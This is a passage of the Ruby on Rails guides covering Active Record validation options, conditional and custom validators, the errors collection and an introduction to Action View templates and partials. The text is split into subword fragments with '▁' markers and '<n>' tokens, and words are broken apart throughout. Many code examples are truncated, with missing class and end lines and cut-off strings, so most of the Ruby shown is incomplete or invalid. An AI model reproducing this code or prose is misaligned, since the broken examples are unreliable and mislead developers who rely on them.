▁In ▁the ▁following ▁example ,< n > we ▁don ' t ▁want ▁names ▁and ▁ s ur name s ▁to ▁begin ▁with ▁lower ▁case .
▁validates _ each ▁: name , ▁: s ur name ▁do ▁| record , ▁ attr , ▁value |
▁The ▁block ▁receive s ▁the ▁record , ▁the ▁attribute ' s ▁name ▁and ▁the ▁attribute ' s ▁value . < n >
▁You ▁can ▁do ▁anything ▁you ▁like ▁to ▁check ▁for ▁valid ▁data ▁within ▁the ▁block .
▁If ▁your < n > validation ▁fails , ▁you ▁should ▁add ▁an ▁error ▁message ▁to ▁the ▁model , ▁therefore < n > ma k ing ▁it ▁invalid .
▁Co m m on ▁Validation ▁ Options
▁These ▁are ▁common ▁validation ▁options :
▁### ▁`: allow _ nil `
▁The ▁`: allow _ nil ` ▁option ▁skip s ▁the ▁validation ▁when ▁the ▁value ▁being ▁validate d ▁is < n >` nil `.
▁message : ▁" % { value } ▁is ▁not ▁a ▁valid ▁size " ▁ }, ▁allow _ nil : ▁true
▁### ▁`: allow _ blank `
▁The ▁`: allow _ blank ` ▁option ▁is ▁similar ▁to ▁the ▁`: allow _ nil ` ▁option .
▁This ▁option < n > will ▁let ▁validation ▁pass ▁if ▁the ▁attribute ' s ▁value ▁is ▁` blank ?` , ▁like ▁` nil ` ▁or ▁an < n > empty ▁string ▁for ▁example .
▁class ▁To p ic ▁< ▁ActiveRecord :: Base
▁validates ▁: title , ▁length : ▁ { ▁is : ▁5 ▁ }, ▁allow _ blank : ▁true
▁To p ic . create ( title : ▁" ") . valid ?
▁To p ic . create ( title : ▁nil ). valid ?
▁### ▁`: message `
▁As ▁you ' ve ▁already ▁seen , ▁the ▁`: message ` ▁option ▁let s ▁you ▁specify ▁the ▁message ▁that < n > will ▁be ▁added ▁to ▁the ▁` errors ` ▁collection ▁when ▁validation ▁fails .
▁When ▁this < n > option ▁is ▁not ▁used , ▁Active ▁Record ▁will ▁use ▁the ▁respective ▁default ▁error ▁message < n > for ▁each ▁validation ▁helper .
▁### ▁`: on `
▁The ▁`: on ` ▁option ▁let s ▁you ▁specify ▁when ▁the ▁validation ▁should ▁happen .
▁The < n > default ▁behavior ▁for ▁all ▁the ▁built - in ▁validation ▁helpers ▁is ▁to ▁be ▁run ▁on ▁save < n > ( b o th ▁when ▁you ' re ▁creating ▁a ▁new ▁record ▁and ▁when ▁you ' re ▁updating ▁it ).
▁If ▁you < n > w ant ▁to ▁change ▁it , ▁you ▁can ▁use ▁` on : ▁: create ` ▁to ▁run ▁the ▁validation ▁only ▁when ▁a < n > new ▁record ▁is ▁created ▁or ▁` on : ▁: update ` ▁to ▁run ▁the ▁validation ▁only ▁when ▁a ▁record < n > is ▁updated .
▁# ▁it ▁will ▁be ▁possible ▁to ▁update ▁email ▁with ▁a ▁duplicate d ▁value
▁validates ▁: email , ▁uniqueness : ▁true , ▁on : ▁: create
▁# ▁it ▁will ▁be ▁possible ▁to ▁create ▁the ▁record ▁with ▁a ▁non - n umeric al ▁ age
▁validates ▁: age , ▁ n umeric al ity : ▁true , ▁on : ▁: update
▁# ▁the ▁default ▁( validates ▁on ▁both ▁create ▁and ▁update )
▁ Strict ▁Validation s
▁You ▁can ▁also ▁specify ▁validations ▁to ▁be ▁ str ic t ▁and ▁raise < n >` ActiveModel :: Strict V al id ation F a il ed ` ▁when ▁the ▁object ▁is ▁invalid .
▁validates ▁: name , ▁presence : ▁ { ▁ str ic t : ▁true ▁ }
▁Person . new . valid ?
▁# ▁=> ▁ ActiveModel :: Strict V al id ation F a il ed : ▁Name ▁can ' t ▁be ▁blank
▁There ▁is ▁also ▁an ▁ability ▁to ▁pass ▁custom ▁exception ▁to ▁`: str ic t ` ▁option .
▁validates ▁: token , ▁presence : ▁true , ▁uniqueness : ▁true , ▁ str ic t : ▁To k en G en er ation E xception
▁# ▁=> ▁To k en G en er ation E xception : ▁To k en ▁can ' t ▁be ▁blank
▁ Conditional ▁Validation
▁Sometimes ▁it ▁will ▁make ▁sense ▁to ▁validate ▁an ▁object ▁only ▁when ▁a ▁given ▁predicate < n > is ▁ satisf i ed .
▁You ▁can ▁do ▁that ▁by ▁using ▁the ▁`: if ` ▁and ▁`: unless ` ▁options , ▁which < n > can ▁take ▁a ▁symbol , ▁a ▁string , ▁a ▁` Proc ` ▁or ▁an ▁` Array `.
▁You ▁may ▁use ▁the ▁`: if `< n > option ▁when ▁you ▁want ▁to ▁specify ▁when ▁the ▁validation ▁** s h o ul d ** ▁happen .
▁If ▁you < n > w ant ▁to ▁specify ▁when ▁the ▁validation ▁** s h o ul d ▁not ** ▁happen , ▁the n ▁you ▁may ▁use ▁the < n >`: unless ` ▁option .
▁### ▁Using ▁a ▁ Symbol ▁with ▁`: if ` ▁and ▁`: unless `
▁You ▁can ▁associate ▁the ▁`: if ` ▁and ▁`: unless ` ▁options ▁with ▁a ▁symbol ▁corresponding < n > to ▁the ▁name ▁of ▁a ▁method ▁that ▁will ▁get ▁called ▁right ▁before ▁validation ▁happens .
▁This ▁is ▁the ▁most ▁commonly ▁used ▁option .
▁validates ▁: card _ number , ▁presence : ▁true , ▁if : ▁: p a id _ with _ card ?
▁def ▁p a id _ with _ card ?
▁p a y ment _ type ▁== ▁" card "
▁### ▁Using ▁a ▁ String ▁with ▁`: if ` ▁and ▁`: unless `
▁You ▁can ▁also ▁use ▁a ▁string ▁that ▁will ▁be ▁evaluated ▁using ▁` eval ` ▁and ▁needs ▁to < n > contain ▁valid ▁Ruby ▁code .
▁You ▁should ▁use ▁this ▁option ▁only ▁when ▁the ▁string < n > re present s ▁a ▁really ▁short ▁condition .
▁validates ▁: s ur name , ▁presence : ▁true , ▁if : ▁" name . nil ? "
▁### ▁Using ▁a ▁ Proc ▁with ▁`: if ` ▁and ▁`: unless `
▁F inally , ▁it ' s ▁possible ▁to ▁associate ▁`: if ` ▁and ▁`: unless ` ▁with ▁a ▁` Proc ` ▁object < n > which ▁will ▁be ▁called .
▁Using ▁a ▁` Proc ` ▁object ▁gives ▁you ▁the ▁ability ▁to ▁write ▁an < n > in line ▁condition ▁instead ▁of ▁a ▁separate ▁method .
▁This ▁option ▁is ▁best ▁suite d ▁for < n > one - line r s .
▁validates ▁: password , ▁confirmation : ▁true ,
▁unless : ▁ Proc . new ▁ { ▁| a | ▁a . password . blank ?
▁### ▁G r o up ing ▁ Conditional ▁validations
▁Sometimes ▁it ▁is ▁useful ▁to ▁have ▁multiple ▁validations ▁use ▁one ▁condition , ▁it ▁can < n > be ▁easily ▁achieve d ▁using ▁` with _ options `.
▁with _ options ▁if : ▁: is _ admin ?
▁do ▁| admin |
▁admin . validates ▁: password , ▁length : ▁ { ▁minimum : ▁10 ▁ }
▁admin . validates ▁: email , ▁presence : ▁true
▁All ▁validations ▁inside ▁of ▁` with _ options ` ▁block ▁will ▁have ▁automatically ▁passed < n > the ▁condition ▁` if : ▁: is _ admin ?`
▁### ▁Co m bin ing ▁Validation ▁Conditions
▁On ▁the ▁other ▁hand , ▁when ▁multiple ▁conditions ▁define ▁whether ▁or ▁not ▁a ▁validation < n > s h o ul d ▁happen , ▁an ▁` Array ` ▁can ▁be ▁used .
▁More over , ▁you ▁can ▁apply ▁both ▁`: if ` ▁and < n >`: unless ` ▁to ▁the ▁same ▁validation .
▁class ▁Co m put er ▁< ▁ActiveRecord :: Base
▁validates ▁: m ous e , ▁presence : ▁true ,
▁if : ▁[" m ar k et . re t a il ? ", ▁: de s k to p ? ]
▁unless : ▁ Proc . new ▁ { ▁| c | ▁c . t rack p ad . present ?
▁The ▁validation ▁only ▁run s ▁when ▁all ▁the ▁`: if ` ▁conditions ▁and ▁non e ▁of ▁the < n >`: unless ` ▁conditions ▁are ▁evaluated ▁to ▁` true `.
▁P er form ing ▁C us to m ▁Validation s
▁When ▁the ▁built - in ▁validation ▁helpers ▁are ▁not ▁enough ▁for ▁your ▁needs , ▁you ▁can < n > write ▁your ▁own ▁validator s ▁or ▁validation ▁methods ▁as ▁you ▁prefer .
▁### ▁C us to m ▁ Validator s
▁C us to m ▁validator s ▁are ▁classes ▁that ▁extend ▁` ActiveModel :: Validator `.
▁These < n > classes ▁must ▁implement ▁a ▁` validate ` ▁method ▁which ▁take s ▁a ▁record ▁as ▁an ▁argument < n > and ▁perform s ▁the ▁validation ▁on ▁it .
▁The ▁custom ▁validator ▁is ▁called ▁using ▁the < n >` validates _ with ` ▁method .
▁class ▁My Validator ▁< ▁ ActiveModel :: Validator
▁unless ▁record . name . start s _ with ?
▁record . errors [: name ] ▁< < ▁' N e ed ▁a ▁name ▁starting ▁with ▁ X ▁please ! '
▁class ▁Person
▁include ▁ ActiveModel :: Validations
▁validates _ with ▁My Validator
▁The ▁easie st ▁way ▁to ▁add ▁custom ▁validator s ▁for ▁valid at ing ▁individual ▁attributes < n > is ▁with ▁the ▁convenient ▁` ActiveModel :: Each Validator `.
▁class ▁Email Validator ▁< ▁ ActiveModel :: Each Validator
▁def ▁validate _ each ( record , ▁attribute , ▁value )
▁unless ▁value ▁= ~ ▁/ \ A ( [ ^ @ \ s ] + ) @ ( ( ? : [ - a - z 0 - 9 ] + \ .) + [ a - z ] { 2 , }) \ z / i
▁record . errors [ attribute ] ▁< < ▁( options [: message ] ▁|| ▁" is ▁not ▁an ▁email ")
▁validates ▁: email , ▁presence : ▁true , ▁email : ▁true
▁As ▁show n ▁in ▁the ▁example , ▁you ▁can ▁also ▁combine ▁standard ▁validations ▁with ▁your < n > own ▁custom ▁validator s .
▁### ▁C us to m ▁ Method s
▁You ▁can ▁also ▁create ▁methods ▁that ▁verify ▁the ▁state ▁of ▁your ▁models ▁and ▁add < n > messages ▁to ▁the ▁` errors ` ▁collection ▁when ▁they ▁are ▁invalid .
▁You ▁can ▁pass ▁more ▁than ▁one ▁symbol ▁for ▁each ▁class ▁method ▁and ▁the ▁respective < n > validations ▁will ▁be ▁run ▁in ▁the ▁same ▁order ▁as ▁they ▁were ▁registered .
▁class ▁ Invoice ▁< ▁ActiveRecord :: Base
▁validate ▁: expiration _ date _ cannot _ be _ in _ the _ past ,
▁: d is count _ cannot _ be _ g re at er _ th an _ to t al _ value
▁def ▁ expiration _ date _ cannot _ be _ in _ the _ past
▁if ▁ expiration _ date . present ?
▁ && ▁ expiration _ date ▁< ▁Date . to day
▁errors . add (: expiration _ date , ▁" can ' t ▁be ▁in ▁the ▁ past ")
▁def ▁d is count _ cannot _ be _ g re at er _ th an _ to t al _ value
▁if ▁d is count ▁ > ▁total _ value
▁errors . add (: d is count , ▁" can ' t ▁be ▁greater ▁than ▁total ▁value ")
▁By ▁default ▁such ▁validations ▁will ▁run ▁every ▁time ▁you ▁call ▁` valid ?` .
▁It ▁is ▁also < n > possibl e ▁to ▁control ▁when ▁to ▁run ▁these ▁custom ▁validations ▁by ▁giv ing ▁an ▁`: on `< n > option ▁to ▁the ▁` validate ` ▁method , ▁with ▁either : ▁`: create ` ▁or ▁`: update `.
▁validate ▁: active _ customer , ▁on : ▁: create
▁def ▁active _ customer
▁errors . add (: customer _ id , ▁" is ▁not ▁active ") ▁unless ▁customer . active ?
▁Work ing ▁with ▁Validation ▁ Error s
▁In ▁addition ▁to ▁the ▁` valid ?` ▁and ▁` invalid ?` ▁methods ▁covered ▁earlier , ▁Rails ▁provides ▁a ▁number ▁of ▁methods ▁for ▁working ▁with ▁the ▁` errors ` ▁collection ▁and ▁in q u ir ing ▁about ▁the ▁validity ▁of ▁objects .
▁The ▁following ▁is ▁a ▁list ▁of ▁the ▁most ▁commonly ▁used ▁methods .
▁P lease ▁refer ▁to ▁the ▁` ActiveModel :: Error s ` ▁documentation ▁for ▁a ▁list ▁of ▁all ▁the ▁available ▁methods .
▁### ▁` errors `
▁Return s ▁an ▁instance ▁of ▁the ▁class ▁` ActiveModel :: Error s ` ▁containing ▁all ▁errors .
▁ Each ▁key ▁is ▁the ▁attribute ▁name ▁and ▁the ▁value ▁is ▁an ▁array ▁of ▁strings ▁with ▁all ▁errors .
▁validates ▁: name , ▁presence : ▁true , ▁length : ▁ { ▁minimum : ▁3 ▁ }
▁person ▁= ▁Person . new
▁person . valid ?
▁person . errors . messages
▁person ▁= ▁Person . new ( name : ▁" John ▁Doe ")
▁person . errors . messages ▁# ▁=> ▁ { }
▁` errors [ ]` ▁is ▁used ▁when ▁you ▁want ▁to ▁check ▁the ▁error ▁messages ▁for ▁a ▁specific ▁attribute .
▁It ▁returns ▁an ▁array ▁of ▁strings ▁with ▁all ▁error ▁messages ▁for ▁the ▁given ▁attribute , ▁each ▁string ▁with ▁one ▁error ▁message .
▁If ▁there ▁are ▁no ▁errors ▁related ▁to ▁the ▁attribute , ▁it ▁returns ▁an ▁empty ▁array .
▁person . errors [: name ] ▁# ▁=> ▁[]
▁person ▁= ▁Person . new ( name : ▁" J D ")
▁person . errors [: name ]
▁### ▁` errors . add `
▁The ▁` add ` ▁method ▁let s ▁you ▁manually ▁add ▁messages ▁that ▁are ▁related ▁to ▁particular ▁attributes .
▁You ▁can ▁use ▁the ▁` errors . full _ messages ` ▁or ▁` errors . to _ a ` ▁methods ▁to ▁view ▁the ▁messages ▁in ▁the ▁form ▁they ▁m ight ▁be ▁displayed ▁to ▁a ▁user .
▁Those ▁particular ▁messages ▁get ▁the ▁attribute ▁name ▁ prepend ed ▁( and ▁ capitalize d ). ▁` add ` ▁receive s ▁the ▁name ▁of ▁the ▁attribute ▁you ▁want ▁to ▁add ▁the ▁message ▁to , ▁and ▁the ▁message ▁itself .
▁def ▁a _ method _ us ed _ for _ validation _ p urpose s
▁errors . add (: name , ▁" cannot ▁contain ▁the ▁characters ▁ !
▁person ▁= ▁Person . create ( name : ▁" !
▁# ▁=> ▁[" cannot ▁contain ▁the ▁characters ▁ !
▁person . errors . full _ messages
▁A nother ▁way ▁to ▁do ▁this ▁is ▁using ▁` [ ] = ` ▁set ter
▁def ▁a _ method _ us ed _ for _ validation _ p urpose s
▁errors [: name ] ▁= ▁" cannot ▁contain ▁the ▁characters ▁ !
▁person ▁= ▁Person . create ( name : ▁" !
▁person . errors [: name ]
▁# ▁=> ▁[" cannot ▁contain ▁the ▁characters ▁ !
▁person . errors . to _ a
▁# ▁=> ▁[" Name ▁cannot ▁contain ▁the ▁characters ▁ !
▁### ▁` errors [: base ]`
▁You ▁can ▁add ▁error ▁messages ▁that ▁are ▁related ▁to ▁the ▁object ' s ▁state ▁as ▁a ▁whole , ▁instead ▁of ▁being ▁related ▁to ▁a ▁specific ▁attribute .
▁You ▁can ▁use ▁this ▁method ▁when ▁you ▁want ▁to ▁say ▁that ▁the ▁object ▁is ▁invalid , ▁no ▁matter ▁the ▁values ▁of ▁its ▁attributes .
▁S ince ▁` errors [: base ]` ▁is ▁an ▁array , ▁you ▁can ▁simply ▁add ▁a ▁string ▁to ▁it ▁and ▁it ▁will ▁be ▁used ▁as ▁an ▁error ▁message .
▁errors [: base ] ▁< < ▁" This ▁person ▁is ▁invalid ▁because ▁ ..."
▁### ▁` errors . clear `
▁The ▁` clear ` ▁method ▁is ▁used ▁when ▁you ▁in t ent ion ally ▁want ▁to ▁clear ▁all ▁the ▁messages ▁in ▁the ▁` errors ` ▁collection .
▁Of ▁course , ▁calling ▁` errors . clear ` ▁upon ▁an ▁invalid ▁object ▁won ' t ▁actually ▁make ▁it ▁valid : ▁the ▁` errors ` ▁collection ▁will ▁now ▁be ▁empty , ▁but ▁the ▁next ▁time ▁you ▁call ▁` valid ?` ▁or ▁any ▁method ▁that ▁ tries ▁to ▁save ▁this ▁object ▁to ▁the ▁database , ▁the ▁validations ▁will ▁run ▁again .
▁If ▁any ▁of ▁the ▁validations ▁fail , ▁the ▁` errors ` ▁collection ▁will ▁be ▁ filled ▁again .
▁person . errors . clear
▁person . errors . empty ?
▁p . save ▁# ▁=> ▁false
▁p . errors [: name ]
▁### ▁` errors . size `
▁The ▁` size ` ▁method ▁returns ▁the ▁total ▁number ▁of ▁error ▁messages ▁for ▁the ▁object .
▁person . errors . size ▁# ▁=> ▁2
▁person ▁= ▁Person . new ( name : ▁" A n d re a ", ▁email : ▁" and re a @ example . com ")
▁person . errors . size ▁# ▁=> ▁0
▁D is play ing ▁Validation ▁ Error s ▁in ▁View s
▁On ce ▁you ' ve ▁created ▁a ▁model ▁and ▁added ▁validations , ▁if ▁that ▁model ▁is ▁created ▁via < n > a ▁web ▁form , ▁you ▁ probably ▁want ▁to ▁display ▁an ▁error ▁message ▁when ▁one ▁of ▁the < n > validations ▁fail .
▁Because ▁every ▁application ▁handle s ▁this ▁kind ▁of ▁thing ▁different ly , ▁Rails ▁does < n > not ▁include ▁any ▁view ▁helpers ▁to ▁help ▁you ▁generate ▁these ▁messages ▁directly .
▁However , ▁due ▁to ▁the ▁rich ▁number ▁of ▁methods ▁Rails ▁gives ▁you ▁to ▁interact ▁with < n > validations ▁in ▁general , ▁it ' s ▁fai r ly ▁easy ▁to ▁build ▁your ▁own .
▁In ▁addition , ▁when < n > generating ▁a ▁scaffold , ▁Rails ▁will ▁put ▁some ▁ERB ▁into ▁the ▁` _ form . html . erb ` ▁that < n > it ▁generates ▁that ▁display s ▁the ▁full ▁list ▁of ▁errors ▁on ▁that ▁model .
▁< div ▁id =" error _ ex p la n ation ">
▁< ul >
▁< li > <%= ▁m s g ▁%></ li >
▁<% ▁end ▁%>
▁</ ul >
▁</ div >
▁F urther more , ▁if ▁you ▁use ▁the ▁Rails ▁form ▁helpers ▁to ▁generate ▁your ▁forms , ▁when < n > a ▁validation ▁error ▁occur s ▁on ▁a ▁field , ▁it ▁will ▁generate ▁an ▁extra ▁` < div >` ▁around < n > the ▁entry .
▁< div ▁class =" field _ with _ errors ">
▁</ div >
▁You ▁can ▁the n ▁style ▁this ▁ div ▁however ▁you ' d ▁like .
▁The ▁default ▁scaffold ▁that < n > Rails ▁generates , ▁for ▁example , ▁add s ▁this ▁CSS ▁rule :
▁ . field _ with _ errors ▁ {
▁p adding : ▁2 p x ;
▁background - color : ▁re d ;
▁display : ▁table ;
▁This ▁means ▁that ▁any ▁field ▁with ▁an ▁error ▁end s ▁up ▁with ▁a ▁2 ▁p i x el ▁re d ▁b order .
▁Action ▁View ▁Over view
▁* ▁What ▁Action ▁View ▁is ▁and ▁how ▁to ▁use ▁it ▁with ▁Rails .
▁* ▁How ▁best ▁to ▁use ▁templates , ▁partials , ▁and ▁layout s .
▁* ▁What ▁helpers ▁are ▁provided ▁by ▁Action ▁View ▁and ▁how ▁to ▁make ▁your ▁own .
▁* ▁How ▁to ▁use ▁local ize d ▁views .
▁What ▁is ▁Action ▁View ?
▁Action ▁View ▁and ▁Action ▁Controller ▁are ▁the ▁two ▁major ▁components ▁of ▁Action ▁Pack .
▁In ▁Rails , ▁web ▁requests ▁are ▁handle d ▁by ▁Action ▁Pack , ▁which ▁ split s ▁the ▁work ▁into ▁a ▁controller ▁part ▁( perform ing ▁the ▁logic ) ▁and ▁a ▁view ▁part ▁( render ing ▁a ▁template ).
▁T ypically , ▁Action ▁Controller ▁will ▁be ▁concern ed ▁with ▁communicat ing ▁with ▁the ▁database ▁and ▁perform ing ▁CRUD ▁actions ▁where ▁necessary .
▁Action ▁View ▁is ▁the n ▁responsib le ▁for ▁com p il ing ▁the ▁response .
▁Action ▁View ▁templates ▁are ▁written ▁using ▁ embedded ▁Ruby ▁in ▁tags ▁m ing l ed ▁with ▁HTML .
▁To ▁avoid ▁cl u tt er ing ▁the ▁templates ▁with ▁b o il er plat e ▁code , ▁a ▁number ▁of ▁helper ▁classes ▁provide ▁common ▁behavior ▁for ▁forms , ▁date s , ▁and ▁strings .
▁It ' s ▁also ▁easy ▁to ▁add ▁new ▁helpers ▁to ▁your ▁application ▁as ▁it ▁e v ol ve s .
▁NOTE : ▁Some ▁features ▁of ▁Action ▁View ▁are ▁ti ed ▁to ▁Active ▁Record , ▁but ▁that ▁does n ' t ▁mean ▁Action ▁View ▁depend s ▁on ▁Active ▁Record .
▁Action ▁View ▁is ▁an ▁in dependent ▁package ▁that ▁can ▁be ▁used ▁with ▁any ▁sort ▁of ▁Ruby ▁libraries .
▁Using ▁Action ▁View ▁with ▁Rails
▁For ▁each ▁controller ▁there ▁is ▁an ▁ associated ▁directory ▁in ▁the ▁` app / views ` ▁directory ▁which ▁hold s ▁the ▁template ▁files ▁that ▁make ▁up ▁the ▁views ▁ associated ▁with ▁that ▁controller .
▁These ▁files ▁are ▁used ▁to ▁display ▁the ▁view ▁that ▁results ▁from ▁each ▁controller ▁action .
▁Let ' s ▁take ▁a ▁look ▁at ▁what ▁Rails ▁does ▁by ▁default ▁when ▁creating ▁a ▁new ▁resource ▁using ▁the ▁scaffold ▁generator :
▁[ . . . ]
▁invoke ▁scaffold _ controller
▁create
▁app
▁invoke ▁ erb
▁app
▁There ▁is ▁a ▁naming ▁convention ▁for ▁views ▁in ▁Rails .
▁T ypically , ▁the ▁views ▁share ▁their ▁name ▁with ▁the ▁ associated ▁controller ▁action , ▁as ▁you ▁can ▁see ▁above .
▁The ▁complete ▁HTML ▁returned ▁to ▁the ▁client ▁is ▁composed ▁of ▁a ▁combination ▁of ▁this ▁ERB ▁file , ▁a ▁layout ▁template ▁that ▁wrap s ▁it , ▁and ▁all ▁the ▁partials ▁that ▁the ▁view ▁may ▁reference .
▁ Template s , ▁ Partial s ▁and ▁Layouts
▁### ▁ Template s
▁Action ▁View ▁templates ▁can ▁be ▁written ▁in ▁sever al ▁ways .
▁Rails ▁supports ▁multiple ▁template ▁systems ▁and ▁uses ▁a ▁file ▁extension ▁to ▁distinguish ▁a mong st ▁them .
▁For ▁example , ▁an ▁HTML ▁file ▁using ▁the ▁ERB ▁template ▁system ▁will ▁have ▁` . html . erb ` ▁as ▁a ▁file ▁extension .
▁#### ▁ERB
▁With in ▁an ▁ERB ▁template , ▁Ruby ▁code ▁can ▁be ▁included ▁using ▁both ▁` < % ▁%> ` ▁and ▁` <%= ▁%> ` ▁tags .
▁The ▁` < % ▁%> ` ▁tags ▁are ▁used ▁to ▁execute ▁Ruby ▁code ▁that ▁does ▁not ▁return ▁anything , ▁such ▁as ▁conditions , ▁loop s ▁or ▁blocks , ▁and ▁the ▁` <%= ▁%> ` ▁tags ▁are ▁used ▁when ▁you ▁want ▁output .
▁Consider ▁the ▁following ▁loop ▁for ▁names :
▁`` ` html + erb
▁< h 1> Name s ▁of ▁all ▁the ▁people </ h 1>
▁<% ▁@ people . each ▁do ▁| person | ▁%>
▁Name : ▁<%= ▁person . name ▁%>< br >
▁So ▁this ▁would ▁be ▁wrong :
▁<% # ▁W R ON G ▁%>
▁H i , ▁M r . ▁<% ▁put s ▁" F r o do " ▁%>
▁To ▁suppress ▁leading ▁and ▁tr ailing ▁whitespace s , ▁you ▁can ▁use ▁` < % - ` ▁` - % >` ▁in ter change ably ▁with ▁` < % ` ▁and ▁` % >` .
▁#### ▁ Builder
▁ Builder ▁templates ▁are ▁a ▁more ▁program ma tic ▁ alternative ▁to ▁ERB .
▁They ▁are ▁es pecially ▁useful ▁for ▁ generating ▁ X ML ▁content .
▁An ▁ X m l M ar k up ▁object ▁named ▁` xml ` ▁is ▁automatically ▁made ▁available ▁to ▁templates ▁with ▁a ▁` . builder ` ▁extension .
▁Here ▁are ▁some ▁basic ▁examples :
▁xml . em (" emph a size d ")
▁xml . em ▁ { ▁xml . b (" emph ▁ & ▁b ol d ") ▁ }
▁xml . a (" A ▁Link ", ▁" href " ▁=> ▁" http :// rubyonrails . org ")
▁xml . target (" name " ▁=> ▁" compile ", ▁" option " ▁=> ▁" fa st ")
▁which ▁would ▁produce :
▁< em > emph a size d </ em >
▁< em >< b > emph ▁ & am p ; ▁b ol d </ b ></ em >
▁< a ▁ href =" http :// rubyonrails . org "> A ▁link </ a >
▁< target ▁option =" fa st " ▁name =" compile " ▁/>
▁Any ▁method ▁with ▁a ▁block ▁will ▁be ▁treat ed ▁as ▁an ▁ X ML ▁markup ▁tag ▁with ▁nested ▁markup ▁in ▁the ▁block .
▁For ▁example , ▁the ▁following :
▁xml . div ▁ {
▁xml . h 1 (@ person . name )
▁xml . p (@ person . b io )
▁would ▁produce ▁something ▁like :
▁< div >
▁< h 1> David ▁H einemeier ▁Hansson </ h 1>
▁< p > A ▁ product ▁of ▁D an is h ▁De sign ▁during ▁the ▁Wi n ter ▁of ▁' 7 9 . . . </ p >
▁Be low ▁is ▁a ▁full - length ▁R SS ▁example ▁actually ▁used ▁on ▁ Base ca mp :
▁xml . r s s (" version " ▁=> ▁" 2 . 0 ", ▁" xml n s : d c " ▁=> ▁" http :// p url . org / d c / e le ment s /1.1 / ") ▁do
▁xml . cha n n el ▁do
▁xml . title (@ feed _ title )
▁xml . link (@ url )
▁xml . description ▁" Base ca mp : ▁Re c ent ▁items "
▁xml . language ▁" en - us "
▁xml . tt l ▁" 4 0 "
▁for ▁item ▁in ▁@ recent _ item s
▁xml . item ▁do
▁xml . title ( item _ title ( item ) )
▁xml . description ( item _ description ( item ) ) ▁if ▁item _ description ( item )
▁xml . p u b Date ( item _ p u b Date ( item ) )
▁xml . guid (@ person . fi rm . account . url ▁ + ▁@ recent _ item s . url ( item ) )
▁xml . link (@ person . fi rm . account . url ▁ + ▁@ recent _ item s . url ( item ) )
▁xml . tag ! ("
▁d c : c re at or ", ▁item . author _ name ) ▁if ▁item _ has _ c re at or ?(
▁#### ▁ Template ▁ Caching
▁By ▁default , ▁Rails ▁will ▁ compile ▁each ▁template ▁to ▁a ▁method ▁in ▁order ▁to ▁render ▁it .
▁When ▁you ▁alter ▁a ▁template , ▁Rails ▁will ▁check ▁the ▁file ' s ▁modification ▁time ▁and ▁re compile ▁it ▁in ▁development ▁mode .
▁### ▁ Partial s
▁ Partial ▁templates ▁- ▁usually ▁just ▁called ▁" partial s " ▁- ▁are ▁another ▁d evi ce ▁for ▁break ing ▁the ▁rendering ▁process ▁into ▁more ▁manage able ▁chunks .
▁With ▁partials , ▁you ▁can ▁extract ▁pieces ▁of ▁code ▁from ▁your ▁templates ▁to ▁separate ▁files ▁and ▁also ▁reuse ▁them ▁throughout ▁your ▁templates .
▁#### ▁N am ing ▁ Partial s
▁<%= ▁render ▁" menu " ▁%>
▁This ▁will ▁render ▁a ▁file ▁named ▁` _ menu . html . erb ` ▁at ▁that ▁point ▁within ▁the ▁view ▁that ▁is ▁being ▁rendered .
▁Note ▁the ▁leading ▁ underscore ▁character : ▁partials ▁are ▁named ▁with ▁a ▁leading ▁ underscore ▁to ▁distinguish ▁them ▁from ▁regular ▁views , ▁even ▁though ▁they ▁are ▁ referred ▁to ▁without ▁the ▁ underscore .
▁This ▁hold s ▁true ▁even ▁when ▁you ' re ▁pull ing ▁in ▁a ▁partial ▁from ▁another ▁folder :
▁<%= ▁render ▁" shared / menu " ▁%>
▁That ▁code ▁will ▁pull ▁in ▁the ▁partial ▁from ▁` app / views / shared / _ menu . html . erb `.
▁#### ▁Using ▁ Partial s ▁to ▁simplif y ▁View s
▁One ▁way ▁to ▁use ▁partials ▁is ▁to ▁treat ▁them ▁as ▁the ▁equivalent ▁of ▁sub r out in es ; ▁a ▁way ▁to ▁move ▁details ▁out ▁of ▁a ▁view ▁so ▁that ▁you ▁can ▁gra s p ▁what ' s ▁going ▁on ▁more ▁easily .
▁For ▁example , ▁you ▁m ight ▁have ▁a ▁view ▁that ▁look s ▁like ▁this :
▁<%= ▁render ▁" shared / ad _ banner " ▁%>
▁< h 1> Product s </ h 1>
▁< p > Here ▁are ▁a ▁few ▁of ▁our ▁fine ▁ products : </ p >
▁<%= ▁render ▁" shared / footer " ▁%>
▁Here , ▁the ▁` _ ad _ banner . html . erb ` ▁and ▁` _ footer . html . erb ` ▁partials ▁could ▁contain ▁content ▁that ▁is ▁ shared ▁a mong ▁many ▁pages ▁in ▁your ▁application .
▁You ▁don ' t ▁need ▁to ▁see ▁the ▁details ▁of ▁these ▁section s ▁when ▁you ' re ▁con c ent ra ting ▁on ▁a ▁particular ▁page .
▁#### ▁The ▁` as ` ▁and ▁` object ` ▁options
▁By ▁default ▁` ActionView :: Partial s :: Partial Render er ` ▁has ▁its ▁object ▁in ▁a ▁local ▁variable ▁with ▁the ▁same ▁name ▁as ▁the ▁template .
▁So , ▁given :
▁<%= ▁render ▁partial : ▁" product " ▁%>
▁within ▁ product ▁we ' ll ▁get ▁`@ product ` ▁in ▁the ▁local ▁variable ▁` product `, ▁as ▁if ▁we ▁ha d ▁written :
▁With ▁the ▁` as ` ▁option ▁we ▁can ▁specify ▁a ▁different ▁name ▁for ▁the ▁local ▁variable .
▁For ▁example , ▁if ▁we ▁want ed ▁it ▁to ▁be ▁` item ` ▁instead ▁of ▁` product ` ▁we ▁would ▁do :
▁The ▁` object ` ▁option ▁can ▁be ▁used ▁to ▁directly ▁specify ▁which ▁object ▁is ▁rendered ▁into ▁the ▁partial ; ▁useful ▁when ▁the ▁template ' s ▁object ▁is ▁else where ▁( eg . ▁in ▁a ▁different ▁instance ▁variable ▁or ▁in ▁a ▁local ▁variable ).
▁For ▁example , ▁instead ▁of :
▁we ▁would ▁do :
▁<%= ▁render ▁partial : ▁" product ", ▁object : ▁@ item ▁%>
▁The ▁` object ` ▁and ▁` as ` ▁options ▁can ▁also ▁be ▁used ▁together :
▁#### ▁Rendering ▁Co ll ection s
▁So ▁this ▁example ▁for ▁rendering ▁all ▁the ▁ products :
▁can ▁be ▁re written ▁in ▁a ▁single ▁line :
▁You ▁can ▁use ▁a ▁shorthand ▁syntax ▁for ▁rendering ▁collection s .
▁As sum ing ▁`@ products ` ▁is ▁a ▁collection ▁of ▁` Product ` ▁instance s , ▁you ▁can ▁simply ▁write ▁the ▁following ▁to ▁produce ▁the ▁same ▁result :
▁<%= ▁render ▁@ products ▁%>
